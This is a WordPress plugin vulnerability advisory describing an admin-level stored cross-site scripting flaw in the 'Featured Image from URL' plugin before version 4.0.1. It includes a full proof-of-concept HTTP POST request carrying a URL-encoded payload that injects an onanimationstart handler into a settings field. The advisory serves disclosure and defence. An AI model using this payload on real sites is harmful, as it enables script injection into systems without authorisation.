## WordPress Plugin Vulnerabilities

# Featured Image from URL < 4.0.1 - Admin+ Stored Cross-Site Scripting

### Description

The plugin does not validate, sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks when the unfiltered\_html capability is disallowed (for example in multisite setup)

### Proof of Concept

POST /wp-admin/admin.php?page=featured-image-from-url HTTP/1.1
Accept: \*/\*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 137
Connection: close
Cookie: [admin+]
nonce\_fifu\_form\_photon=97e59a4740&fifu\_input\_photon=on%22%20style%3danimation-name%3arotation%20onanimationstart%3dalert(%2fXSS%2f)%2f%2f
The XSS will be triggered when accessing the settings again
